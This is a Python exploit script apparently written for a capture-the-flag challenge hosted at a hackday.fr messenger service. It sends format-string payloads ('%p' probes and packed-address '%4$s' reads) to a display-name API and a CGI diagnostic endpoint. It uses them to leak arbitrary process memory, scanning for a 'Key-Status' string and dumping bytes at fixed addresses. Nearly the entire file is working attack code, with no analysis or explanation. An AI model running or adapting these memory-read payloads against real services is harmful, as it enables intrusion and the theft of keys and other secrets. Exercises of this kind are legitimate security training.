#!/usr/bin/env python3
import urllib.request
import urllib.parse
import struct
import time

BASE = "http://millenium-messenger.hackday.fr:8000"

def send_set_name(name):
    url = f"{BASE}/api/set_displayname"
    data = urllib.parse.urlencode({'name': name}).encode()
    # Wait, the API takes JSON.
    req = urllib.request.Request(url, data=f'{{"name": "{name}"}}'.encode(), headers={'Content-Type': 'application/json'})
    try:
        with urllib.request.urlopen(req) as resp:
            return resp.getheader('X-MSN-DisplayName', ''), resp.read().decode()
    except Exception as e:
        return str(e), ""

def send_diag_raw(body_bytes):
    encoded = urllib.parse.quote(body_bytes, safe='')
    url = f"{BASE}/cgi-bin/msn_diag?cmd=MSG&body={encoded}"
    try:
        with urllib.request.urlopen(url) as resp:
            return resp.read()
    except Exception as e:
        return b""

def extract_diag(raw):
    marker = b'DIAG '
    idx = raw.find(marker)
    if idx >= 0:
        return raw[idx+5:].rstrip(b'\r\n')
    return b''

print("=== Checking set_displayname for format string vulnerability ===")
header, body = send_set_name("%p.%p.%p.%p")
print(f"Header: {header}")

print("\n=== Scanning for 'Key-Status' in memory ===")
for addr in range(0x0804a000, 0x0804b000, 32):
    # Read memory as string
    payload = struct.pack('<I', addr) + b"M%4$s"
    raw = send_diag_raw(payload)
    content = extract_diag(raw)
    
    # Clean UTF-8/Latin-1 mangling
    try:
        marker = b"M"
        idx = content.find(marker)
        if idx >= 0:
            leaked = content[idx+1:]
            res = leaked.decode('utf-8').encode('latin-1')
            if b"Key-Status" in res:
                print(f"Found 'Key-Status' at 0x{addr:08x}: {repr(res)}")
                # Scan around here!
    except:
        pass

print("\n=== Dumping potential key area NEAR 0x08049530 ===")
# pos 3 was 0x08049530.
# Let's try to find what is STORED at 0x08049530 itself.
payload = struct.pack('<I', 0x08049530) + b"M%4$s"
res = extract_diag(send_diag_raw(payload))
print(f"At 0x08049530: {res.hex()} | {repr(res)}")
